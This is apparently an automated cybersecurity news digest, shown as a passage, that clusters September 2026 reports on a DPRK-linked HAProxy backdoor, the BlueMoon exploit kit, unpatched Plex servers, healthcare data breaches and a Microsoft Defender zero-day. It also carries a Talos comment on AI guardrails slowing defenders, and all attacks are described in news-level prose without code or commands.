efforts. They have also resulted in ransomware operators placing “Azim sucks” in their code and accusing him of belonging to the very criminal groups he was investigating. His experiences also expose the problem with treating adversaries as uniformly sophisticated operators. Some are technically capable and highly organised. Others are impulsive, ego-driven, or one-trick ponies. Many have a scary detachment from the consequences of their actions. Increasingly, Azim is seeing less-experienced threat actors working through loosely organised online collectives. Intelligence necessarily turns that disorder into something defenders can understand and use. But occasionally, it is worth looking behind the finished product – the patience it takes to get accurate answers, who we are investigating, and the deeply human behaviour that shapes both sides. This Beers with Talos episode, “Eight People Walk Into a Dark Web Forum. They’re All Azim,” isn’t exactly going to help many people in our industry sleep better at night. But for anyone wanting to understand more about the threat we’re up against, as a co-host of the pod I’m biased, but I believe it’s an essential listen. And if that doesn’t inspire you to download the episode, perhaps my live review of trying Flamin’ Hot Cheetos for the very first time (with a chaser of Nerds) will. The one big thing Cisco Talos is highlighting a growing operational hurdle for security teams that we call the AI "safety penalty." As frontier AI models advance, their built-in guardrails are increasingly blocking legitimate defensive tasks. This was evident in July 2026 when Hugging Face's primary cloud LLM refused to analyze forensic data during a breach, delaying their response. While defenders are slowed by these frustrating refusals, adversaries are freely leveraging unconstrained models to attack at machine speed. Why do I care? This guardrail asymmetry hands the advantage directly to attackers. When a cloud-hosted AI model refuses a forensic request mid-incident, defenders lose precious time. Security teams are paying for vendor-imposed limitations without gaining a capability edge, especially as open-weight alternatives close the reasoning gap. Ultimately, relying on third-party alignment policies means a sudden update in Silicon Valley could quietly break your defensive workflows overnight. So now what? Security leadership
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: The story behind the intelligence
  - Published: 2026-09-03T18:00:13+00:00
  - Link: https://blog.talosintelligence.com/the-story-behind-the-intelligence/
  - Summary: From engaging with cybercriminals to surviving a live Flamin’ Hot Cheetos taste test, Hazel reflects on the latest Beers with Talos with Azim, where they cover the full spectrum of what it takes to gather threat intel.

### Cluster 93a2320bbc — score 10

- Title: DPRK APTs: Ted backdoor and curlRAT target South Korean media and automotive sectors
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-09-04T12:00:00+00:00
- Link: https://www.rapid7.com/blog/post/tr-dprk-apts-ted-backdoor-curlrat-target-south-korean-media-automotive-sectors
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, web_shell_backdoor
- actor_attribution: APT37, Kimsuky
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: apt_espionage, web_shell_backdoor
- actor_attribution: Kimsuky, APT37
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Overview A new Linux toolkit, identified by Rapid7 Labs, has been targeting organizations across South Korea’s automotive and media industries with minimal detection. The campaign made use of a HAProxy instance named “ted backdoor”, alongside trojanized versions of crond, agetty, atd, sshd, and polkitd. This previously undocumented framework enabled threat actors to execute remote commands on compromised servers, inject malicious scripts into web traffic, perform credential harvesting, and engage in long-term surveillance. The standout feature of this toolkit is its depth of integration with the target environment. The ted backdoor is compiled as part of the victim’s existing HAProxy version 2.8.12. It uses its native filter API, internal memory pools, event scheduler, and process management infrastructure to intercept traffic and hide from monitoring, while genuine load balancing traffic operates as expected. Operating alongside this are an SSH keylogger, a curl-based RAT, and a stage
```

#### Full body

```
Back to Blog Threat Research DPRK APTs: Ted backdoor and curlRAT target South Korean media and automotive sectors Rapid7 Labs Sep 4, 2026 | Last updated on Sep 4, 2026 | 24 min read DISCOVER RAPID7 MDR Overview A new Linux toolkit, identified by Rapid7 Labs, has been targeting organizations across South Korea’s automotive and media industries with minimal detection. The campaign made use of a HAProxy instance named “ted backdoor”, alongside trojanized versions of crond, agetty, atd, sshd, and polkitd. This previously undocumented framework enabled threat actors to execute remote commands on compromised servers, inject malicious scripts into web traffic, perform credential harvesting, and engage in long-term surveillance. The standout feature of this toolkit is its depth of integration with the target environment. The ted backdoor is compiled as part of the victim’s existing HAProxy version 2.8.12. It uses its native filter API, internal memory pools, event scheduler, and process management infrastructure to intercept traffic and hide from monitoring, while genuine load balancing traffic operates as expected. Operating alongside this are an SSH keylogger, a curl-based RAT, and a stager. The RAT maintains a watchdog thread dedicated to tracking HAProxy’s health, and reporting it back to the operator’s infrastructure. The earliest uploads on VirusTotal date back to mid-2025 and the involved HAProxy 2.8.12-0fdb194 was released on 22 November 2024, establishing this as the earliest possible compilation date for this build. The toolkit is attributed with medium confidence to DPRK APTs, given that the attacks Rapid7 observed were targeting South Korean media and automotive sectors, likely aiming at long-term espionage, the usage of simple xor-based encryption, custom substitution cipher, and the list of C2s hardcoded is associated to APT37 by ThreatFox and maltrail . Analysis shows that the ted backdoor could be part of a broader framework covering nginx backdoor as well. The ted plugin registers a custom HAProxy filter that hooks the HTTP parser to inspect and log high-value traffic, steal session cookies, and perform a client IP selection to decide whether to inject custom scripts in the webpage being rendered. Technical analysis Rapid7 researchers revealed that the toolkit was used in campaigns targeting South Korean automotive and media sectors likely dating back to early 2025. The number of trojanized binaries and functionalities found suggest the scope could be long-term cyber espionage and surveillance. However, gathered evidence does not suffice to establish a timeline nor how the initial access was performed. At the time of analysis, both victims were running an edge webserver with ports 80, 443, and 25 exposed. Port 443 hosted the Groupware login portal and port 25 exposed a mail server. Either surface represents a plausible initial access vector consistent with documented Kimsuky tradecraft. Since the beginning of 2026 Kimsuky has been observed exploiting RCE vulnerabilities in externally accessible mail servers to compromise South Korean groupware vendors, while Groupware web portals represent the kind of exposed authenticated application that DPRK-nexus actors have repeatedly targeted for credential harvesting and exploitation. The specific entry point and any associated CVE remain unconfirmed pending further forensic evidence. The scenario shown in Figure 1 assumes the initial access is obtained by exploitation of CVEs related to the Groupware portal. Figure 1: Attack chain partially reconstructed ⠀ The threat actor begins by exploiting a vulnerability in the Groupware login portal running on the edge webserver, gaining an initial foothold in the DMZ. From there, they establish persistence and harvest credentials from the compromised edge host (e.g. SSH keylogger), which also doubles as a staging server hosting the trojanized system ELFs. With a foothold on the edge, the attacker pivots inward and drops the stager onto
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: DPRK APTs: Ted backdoor and curlRAT target South Korean media and automotive sectors
  - Published: 2026-09-04T12:00:00+00:00
  - Link: https://www.rapid7.com/blog/post/tr-dprk-apts-ted-backdoor-curlrat-target-south-korean-media-automotive-sectors
  - Summary: Overview A new Linux toolkit, identified by Rapid7 Labs, has been targeting organizations across South Korea’s automotive and media industries with minimal detection. The campaign made use of a HAProxy instance named “ted backdoor”, alongside trojanized versions of crond, agetty, atd, sshd, and polkitd. This previously undocumented framework enabled threat actors to execute remote commands on compromised servers, inject malicious scripts into web traffic, perform credential harvesting, and engage in long-term surveillance. The standout feature of this toolkit is its depth of integration with the target environment. The ted backdoor is compiled as part of the victim’s existing HAProxy version 2.8.12. It uses its native filter API, internal memory pools, event scheduler, and process management infrastructure to intercept traffic and hide from monitoring, while genuine load balancing traffic operates as expected. Operating alongside this are an SSH keylogger, a curl-based RAT, and a stage

### Cluster 26a67e9e74 — score 10

- Title: New 'BlueMoon' kit exploited Windows and Chrome zero-day flaws
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-09-10T14:11:34+00:00
- Link: https://www.bleepingcomputer.com/news/security/new-bluemoon-kit-exploited-windows-and-chrome-zero-day-flaws/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng, web_shell_backdoor, zero_day
- actor_attribution: APT31
- affected_industries: aviation_defense, government, manufacturing_industrial
- cve_ids: CVE-2026-85046, CVE-2026-85880, CVE-2026-87491
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, zero_day, apt_espionage, web_shell_backdoor
- actor_attribution: APT31
- affected_industries: government, manufacturing_industrial, aviation_defense
- cve_ids: CVE-2026-85046, CVE-2026-87491, CVE-2026-85880
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Multiple cyber-espionage groups deployed an exploit kit dubbed "BlueMoon" that leveraged zero-day vulnerabilities in Microsoft Windows and Google Chrome. [...]
```

#### Full body

```
New 'BlueMoon' kit exploited Windows and Chrome zero-day flaws By Bill Toulas September 10, 2026 10:11 AM 0 Multiple cyber-espionage groups deployed an exploit kit dubbed “BlueMoon” that leveraged zero-day vulnerabilities in Microsoft Windows and Google Chrome. BlueMoon combines two security issues in Chromium-based browsers that allow remote code execution and sandbox escape with a kernel local privilege escalation in Windows. The kit appears to be a shared modular tool that supports exploit additions and was used in distinct operations. Researchers at enterprise cybersecurity company Proofpoint observed BlueMoon being used since August 28 in spearphishing operations attributed to the JungleBamboo (a.k.a. APT31, Violet Typhoon, APT31, Tide Castle) threat actor associated with China. Cybersecurity and threat intelligence company Volexity also observed similar activity on September 1st, in campaigns from another actor it tracks as UTA0560 that targeted "customers at multiple non-governmental organizations (NGOs)." According to the researchers, the BlueMoon developer maintainers take advantage of the delay between public Chromium fixes and stable Chrome releases, reverse-engineer public code changes, and create exploits to target downstream browser users. The three flaws chained by the BlueMoon exploit kit are: CVE-2026-85046 : a type-confusion flaw in Chrome’s V8 JavaScript engine that provides arbitrary memory access inside the V8 sandbox CVE-2026-87491 : a V8 sandbox escape that corrupts WebAssembly metadata to run embedded shellcode CVE-2026-85880 : a heap-based buffer overflow in Windows ALPC that allows local privilege escalation Proofpoint says attackers exploited CVE-2026-85880 as a classic zero-day, suspecting it has been leveraged since 2025 and repackaged in BlueMoon. “The LPE DLL compilation timestamp is from 2025 and did not appear to be forged,” Proofpoint explains . “This - combined with the exploit targeting older Windows builds - suggests that the exploit creator repackaged an existing capability into the BlueMoon exploit kit.” BlueMoon runs the exploit inside a Web Worker, retrying it up to five times. It fingerprints the system, exploits the Windows privilege elevation flaw to elevate the Chrome renderer, and injects into Chrome’s parent process to run an operator-selected command. The default final command uses curl to save an executable, typically a malware loader, under %TEMP% and run it. BlueMoon attack chain overview Source: Proofpoint Threat groups and targets The reports from Volexity and Proofpoint [ 1 , 2 ] identify four distinct activity clusters associated with BlueMoon deployments, three of them described as Chinese or China-aligned. JungleBamboo, the first Chinese state-sponsored actor observed using BlueMoon, is known for targeting NGOs in the US, mining companies, and individual high-value targets, using the Longtale/GemStone credential stealer extension disguised as Google Gemini. The second hacker group is UTA0560, which targeted NGOs using donation lures and triggered an infection chain that delivered Grimwedge, an in-memory JScript backdoor for reconnaissance, file and process management, command execution, and payload uploads. Phishing emails used in the attacks Source: Proofpoint The third cluster is tracked as UNK_LateNight, known for deploying the ShadowPad backdoor on systems belonging to U.S. aerospace and defense-industrial-base companies. A fourth group, tracked as UNK_DoubleCheck, targeted Vietnamese manufacturing firms with an in-memory Rust loader, though the final payload couldn’t be retrieved for analysis. Proofpoint expects BlueMoon adoption and deployment to increase, potentially reaching financially motivated attackers in the future, so defenders are advised to use the provided indicators of compromise in both reports to block the activity early. Both cybersecurity companies shared indicators of compromise for files and network infrastructure observed in attacks using the Blu
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: New 'BlueMoon' kit exploited Windows and Chrome zero-day flaws
  - Published: 2026-09-10T14:11:34+00:00
  - Link: https://www.bleepingcomputer.com/news/security/new-bluemoon-kit-exploited-windows-and-chrome-zero-day-flaws/
  - Summary: Multiple cyber-espionage groups deployed an exploit kit dubbed "BlueMoon" that leveraged zero-day vulnerabilities in Microsoft Windows and Google Chrome. [...]

### Cluster 6d3c34c28d — score 10

- Title: Over 36,000 exposed Plex servers vulnerable to recent flaws
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-09-09T10:11:29+00:00
- Link: https://www.bleepingcomputer.com/news/security/over-36-000-plex-servers-unpatched-against-recently-disclosed-flaws/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, data_breach
- cve_ids: CVE-2020-5741, CVE-2025-34158, CVE-2026-20079
- urgency_signals: actively_exploited, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach, active_exploitation
- cve_ids: CVE-2025-34158, CVE-2020-5741, CVE-2026-20079
- urgency_signals: actively_exploited, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Over 36,000 Plex Media servers exposed online remain unpatched against multiple security vulnerabilities and are vulnerable to attacks. [...]
```

#### Full body

```
Over 36,000 exposed Plex servers vulnerable to recent flaws By Sergiu Gatlan September 9, 2026 06:11 AM 2 Over 36,000 Plex Media servers exposed online remain unpatched against multiple security vulnerabilities and are vulnerable to attacks. Plex urged users a week ago to secure their media servers immediately against security issues that still lack CVE IDs for easy tracking. While the company didn't provide additional details on Tuesday when it issued the warning, these security flaws are known to affect Plex Media Server v1.43.2 and earlier. Those running affected versions are advised to secure their systems as soon as possible by upgrading Plex Media Server installations to version 1.43.3 (released on May 19 ) and their Plex Desktop clients to 1.115.0 (released on August 13 ), which can be downloaded from the server management page or the official downloads page . "We recently released Plex Media Server 1.43.3 and Plex Desktop 1.115.0 to address a number of security issues. We recommend all server owners and Desktop users update to the latest version as soon as possible," Plex said. "CVEs have been requested and we'll reply to this thread with more details once they're published. If you're running Plex Media Server on a NAS device, the updated version may not be available in their package manager yet but you can install the package manually." On Friday, nonprofit security organization Shadowserver warned that over 36,000 Plex Media Server instances exposed online are still unpatched and vulnerable to potential attacks. Internet-exposed Plex Media servers (Shadowserver) "Since 2026-09-04 we are scanning/reporting daily unpatched versions of Plex Media Server in response to an advisory issued by Plex for v1.43.2 & earlier. Over 36K instances found still unpatched," Shadowserver said . "No CVEs have been issued meaning the vulnerabilities are invisible to the security community limiting an effective response." ​​Although Plex hasn't shared any details about these flaws so far, users should follow the company's warning and secure their servers before attackers reverse-engineer the patches and develop an exploit, since this is one of a very limited number of instances where it has also emailed customers about patching their systems as soon as possible. In August 2025, Plex warned users to patch a high-severity vulnerability now tracked as CVE-2025-34158 that can be exploited to steal the server owner's credentials. CISA also flagged a Plex Media Server remote code execution flaw (CVE-2020-5741) as actively exploited two years earlier , which can allow attackers to make the server execute malicious code . While the cybersecurity agency has yet to share more information on the attacks exploiting CVE-2020-5741, it was likely used to hack the computer of a LastPass senior DevOps engineer , leading to a massive August 2022 data breach after threat actors stole credentials and compromised the LastPass corporate vault. That same month, Plex notified users of a data breach , warning them to reset passwords after the attackers accessed a database containing emails, usernames, and encrypted credentials. Once attackers have valid credentials, only 37% of their actions are blocked Overall prevention scores can hide what happens after initial access. Once attackers are using valid credentials, prevention drops sharply. The Blue Report 2026 measures defenses technique by technique across 338 million simulations run in customer production environments. Get the report Related Articles: Plex warns users to patch security vulnerabilities immediately CISA orders urgent patching of actively exploited Zimbra flaw Citrix urges admins to patch new NetScaler flaws as soon as possible Zimbra urges customers to patch critical web client XSS flaw Cisco confirms CVE-2026-20079 Secure FMC flaw exploited in attacks
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Over 36,000 exposed Plex servers vulnerable to recent flaws
  - Published: 2026-09-09T10:11:29+00:00
  - Link: https://www.bleepingcomputer.com/news/security/over-36-000-plex-servers-unpatched-against-recently-disclosed-flaws/
  - Summary: Over 36,000 Plex Media servers exposed online remain unpatched against multiple security vulnerabilities and are vulnerable to attacks. [...]

### Cluster b7da86183f — score 10

- Title: 4.1 Million Impacted by AdaptHealth Data Breach
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-09-10T11:20:43+00:00
- Link: https://www.securityweek.com/4-1-million-impacted-by-adapthealth-data-breach/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, phishing_social_eng, ransomware_extortion, zero_day
- affected_industries: financial_services, healthcare, manufacturing_industrial
- affected_products: Android, Fortinet, Ivanti
- urgency_signals: zero_day
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, zero_day, data_breach
- affected_industries: healthcare, financial_services, manufacturing_industrial
- affected_products: Fortinet, Ivanti, Android
- urgency_signals: zero_day
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
In June 2026, hackers stole personal, health, and insurance information from AdaptHealth’s systems. The post 4.1 Million Impacted by AdaptHealth Data Breach appeared first on SecurityWeek .
```

#### Full body

```
More than 4.1 million individuals had their personal, health, and insurance information stolen in a data breach at healthcare company AdaptHealth. Operating over 680 facilities across the US, AdaptHealth describes itself as a network of medical equipment companies that provides patients with healthcare solutions and medical equipment. The company was hacked in early June, when a threat actor gained access to its cloud-based applications, including internal systems used for patient management and document storage. After the attacker contacted the company, it confirmed the data breach, including the theft of a password file associated with insurance billing. The hacker used social engineering to compromise a user session at a third-party contractor, AdaptHealth said. On August 14, the company announced that the threat actor had exfiltrated names, contact and demographic information, and health and health insurance information. Advertisement. Scroll to continue reading. The company said Social Security numbers and financial information were not affected. At the time, it also notified the US Department of Health and Human Services (HHS) that 4,115,802 individuals were affected. HHS added AdaptHealth to its data breach portal this week. Another major healthcare data breach reported to the HHS on August 14 and recently added to the portal affected clinical genomics company Baylor Genetics. Like AdaptHealth, Baylor Genetics was hacked in June, and hackers stole patients’ names, dates of birth, medical test data, health insurance information, and Social Security numbers. The PII of Baylor Genetics’ employees was also compromised in the incident, along with their financial information. Overall, hackers stole the electronic protected health information of 2,810,878 individuals, Baylor Genetics told the HHS. Related: Manchester Airports Group Data on 8.8 Million People Leaked After Ransom Refusal Related: 153 Million Driver License Images Offered on Dark Web Related: Ransomware Gang Claims Nutex Health Data Breach Related: 9.5 Million Impacted by Aesto Health Data Breach Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire Android’s September 2026 Updates Patch 180 Vulnerabilities Chipmaker Patch Tuesday: Nvidia, AMD, Arm Issue Security Advisories Fortinet Patches Critical Vulnerabilities in FortiMonitorOnSight, Chrome Extension ICS Patch Tuesday: Schneider Electric, Siemens Fix Critical Flaws Ivanti Patches Critical Flaws Across Enterprise Security Products Chrome 153 Patches Seventh Zero-Day of 2026 Microsoft Patches Record 974 Vulnerabilities, Including Two Exploited Zero-Days Adobe Patches Over 170 Vulnerabilities, Including Commerce Zero-Day Latest News Deceptive Android Apps Exploit Google Play Early Access to Evade Reviews Webinar Today: Keep Pace With AI – A New Operating Model for Endpoint Remediation Critical NetScaler Vulnerability Exploited in Attacks Widened Scan Turns Up Fourth Rogue Claude Cyber Incident Organizations Warned of Cisco Secure FMC Exploitation New ‘ShieldCrash’ Zero-Day Exploit Targets Microsoft Defender Fortinet Code Execution Flaw Exploited in PivotC2 RAT Attacks HelmGuard Raises $7.3 Million for Agentic GRC and Security Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Virtual Event: Attack Surface Management Summit 2026 September 16, 2026 Join as speakers examine the various components of ASM strategy, the push to mandate continuous asset visibility and inventory tools, and the use of red-teaming, bug bounties and pen-tests in modern security programs. Register Webinar: Minimum Viable Business: Can You Prove Your Organization Would Recover? September 2, 2026 In thi
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: 4.1 Million Impacted by AdaptHealth Data Breach
  - Published: 2026-09-10T11:20:43+00:00
  - Link: https://www.securityweek.com/4-1-million-impacted-by-adapthealth-data-breach/
  - Summary: In June 2026, hackers stole personal, health, and insurance information from AdaptHealth’s systems. The post 4.1 Million Impacted by AdaptHealth Data Breach appeared first on SecurityWeek .

### Cluster ebab743067 — score 10

- Title: New ‘ShieldCrash’ Zero-Day Exploit Targets Microsoft Defender
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-09-10T07:09:36+00:00
- Link: https://www.securityweek.com/new-shieldcrash-zero-day-exploit-targets-microsoft-defender/
- Fetch status: not_attempted
- Member count: 3
- Corroborating source count: 3
- Strong signals: Microsoft Defender

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- affected_products: Microsoft Defender
- cve_ids: CVE-2026-69414
- urgency_signals: poc_available, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day
- affected_products: Microsoft Defender
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The exploit provides full System privileges on Windows machines running the September 2026 patches. The post New ‘ShieldCrash’ Zero-Day Exploit Targets Microsoft Defender appeared first on SecurityWeek .
```

#### Corroborating sources (3)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: New ‘ShieldCrash’ Zero-Day Exploit Targets Microsoft Defender
  - Published: 2026-09-10T07:09:36+00:00
  - Link: https://www.securityweek.com/new-shieldcrash-zero-day-exploit-targets-microsoft-defender/
  - Summary: The exploit provides full System privileges on Windows machines running the September 2026 patches. The post New ‘ShieldCrash’ Zero-Day Exploit Targets Microsoft Defender appeared first on SecurityWeek .
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Researcher Drops New Microsoft Defender PoC Showing ShieldBreak Patch Can Be Bypassed
  - Published: 2026-09-09T06:47:27+00:00
  - Link: https://thehackernews.com/2026/09/researcher-drops-new-microsoft-defender.html
  - Summary: The security researcher known as Chaotic Eclipse has dropped a proof-of-concept (PoC) for yet another zero-day in Microsoft Defender. The vulnerability, codenamed ShieldCrash, is assessed to be a patch bypass for CVE-2026-69414 (CVSS score: 7.8), also called ShieldBreak, which the researcher reported last month. "Microsoft has failed to properly patch ShieldBreak CVE-2026-69414," Chaotic
- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: New Microsoft Defender 'ShieldCrash' zero-day grants SYSTEM access
  - Published: 2026-09-09T07:30:15+00:00
  - Link: https://www.bleepingcomputer.com/news/security/new-microsoft-defender-shieldcrash-zero-day-grants-system-access/
  - Summary: An anonymous security researcher known as Nightmare Eclipse has released a new Microsoft Defender zero-day exploit named "ShieldCrash" right after Microsoft rolled out its September 2026 Patch Tuesday security updates. [...]

### Cluster b04cf6724c — score 10

- Title: GRIMBOLT C2 Infrastructure Recon: Pivoting From One IP to a Mapped Cluster
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-09-04T13:13:54+00:00
- Link: https://www.team-cymru.com/post/grimbolt-c2-infrastructure-mapping-and-reconnaisssance
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: UNC6201

#### Cluster taxonomy (union across members)
- actor_attribution: UNC6201
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- actor_attribution: UNC6201
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Explore how to Map GRIMBOLT C2 infrastructure linked to UNC6201 by pivoting from one IP using WHOIS, PDNS, ports, and X509 certificate fingerprints.
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: GRIMBOLT C2 Infrastructure Recon: Pivoting From One IP to a Mapped Cluster
  - Published: 2026-09-04T13:13:54+00:00
  - Link: https://www.team-cymru.com/post/grimbolt-c2-infrastructure-mapping-and-reconnaisssance
  - Summary: Explore how to Map GRIMBOLT C2 infrastructure linked to UNC6201 by pivoting from one IP using WHOIS, PDNS, ports, and X509 certificate fingerprints.

### Cluster fb556ca51b — score 10

- Title: Cl0p Til you Drop - 6 Years, 10 Campaigns, 8 Zero-Days
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-09-04T13:13:54+00:00
- Link: https://www.team-cymru.com/post/cl0p-ransomware-mft-attack-pattern-threat-intelligence
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: Cl0p

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- actor_attribution: Cl0p
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- actor_attribution: Cl0p
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Analyze Cl0p ransomware's history of targeting MFT systems. Discover their attack pattern in threat intelligence to improve cyber attack surface reduction.
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Cl0p Til you Drop - 6 Years, 10 Campaigns, 8 Zero-Days
  - Published: 2026-09-04T13:13:54+00:00
  - Link: https://www.team-cymru.com/post/cl0p-ransomware-mft-attack-pattern-threat-intelligence
  - Summary: Analyze Cl0p ransomware's history of targeting MFT systems. Discover their attack pattern in threat intelligence to improve cyber attack surface reduction.

### Cluster c1f52c0381 — score 10

- Title: Tracking ORBs on Singapore's Telecommunications Networks
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-09-04T13:13:53+00:00
- Link: https://www.team-cymru.com/post/tracking-orbs-on-singapores-telecommunications-networks
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: UNC3886

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage
- actor_attribution: UNC3886
- affected_industries: telecommunications
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: apt_espionage
- actor_attribution: UNC3886
- affected_industries: telecommunications
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
APT attacks by UNC3886 target Singapore telecom using ORB networks. Learn practical ORB tracking techniques to uncover hidden infrastructure with Scout.
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Tracking ORBs on Singapore's Telecommunications Networks
  - Published: 2026-09-04T13:13:53+00:00
  - Link: https://www.team-cymru.com/post/tracking-orbs-on-singapores-telecommunications-networks
  - Summary: APT attacks by UNC3886 target Singapore telecom using ORB networks. Learn practical ORB tracking techniques to uncover hidden infrastructure with Scout.

### Cluster fc5c9992d3 — score 10

- Title: Scattered Spider Attacks | Infrastructure and TTP Analysis
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-09-04T13:13:53+00:00
- Link: https://www.team-cymru.com/post/scattered-spider-attacks-infrastructure-profile
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: Scattered Spider

#### Cluster taxonomy (union across members)
- actor_attribution: Scattered Spider
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- actor_attribution: Scattered Spider
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
An in-depth analysis of Scattered Spider attacks, detailing the group’s infrastructure usage and TTPs to help defenders detect and disrupt activity earlier.
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Scattered Spider Attacks | Infrastructure and TTP Analysis
  - Published: 2026-09-04T13:13:53+00:00
  - Link: https://www.team-cymru.com/post/scattered-spider-attacks-infrastructure-profile
  - Summary: An in-depth analysis of Scattered Spider attacks, detailing the group’s infrastructure usage and TTPs to help defenders detect and disrupt activity earlier.

### Cluster b579a537a6 — score 10

- Title: Rhysida Publishes Berlin Government Data After €2m Extortion Demand Refused
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-09-07T12:00:00+00:00
- Link: https://www.infosecurity-magazine.com/news/rhysida-berlin-data-extortion/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: Rhysida

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- actor_attribution: Rhysida
- affected_industries: government
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- actor_attribution: Rhysida
- affected_industries: government
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
The ransomware group’s published dataset reportedly includes Berlin state employee data, as well as highly sensitive emergency plans
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Rhysida Publishes Berlin Government Data After €2m Extortion Demand Refused
  - Published: 2026-09-07T12:00:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/rhysida-berlin-data-extortion/
  - Summary: The ransomware group’s published dataset reportedly includes Berlin state employee data, as well as highly sensitive emergency plans

### Cluster eccfbb9596 — score 9

- Title: Veradigm warns of patient data breach after ransomware gang claims attack
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-09-09T15:31:23+00:00
- Link: https://www.bleepingcomputer.com/news/security/veradigm-discloses-patient-data-breach-after-gentlemen-gang-claims-attack/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion
- affected_industries: healthcare
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, data_breach
- affected_industries: healthcare
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Healthcare technology company Veradigm disclosed a data breach after a cybersecurity incident at one of its third-party vendors exposed patients' personal data. [...]
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Veradigm warns of patient data breach after ransomware gang claims attack
  - Published: 2026-09-09T15:31:23+00:00
  - Link: https://www.bleepingcomputer.com/news/security/veradigm-discloses-patient-data-breach-after-gentlemen-gang-claims-attack/
  - Summary: Healthcare technology company Veradigm disclosed a data breach after a cybersecurity incident at one of its third-party vendors exposed patients' personal data. [...]

### Cluster 8e76e4eaf9 — score 9

- Title: Mythos Vulnerability Firehose Hits a Human Bottleneck
- Source: Dark Reading (cyber_news_breach_reporting)
- Published: 2026-09-09T21:19:55+00:00
- Link: https://www.darkreading.com/application-security/mythos-vulnerability-firehose-hits-human-bottleneck
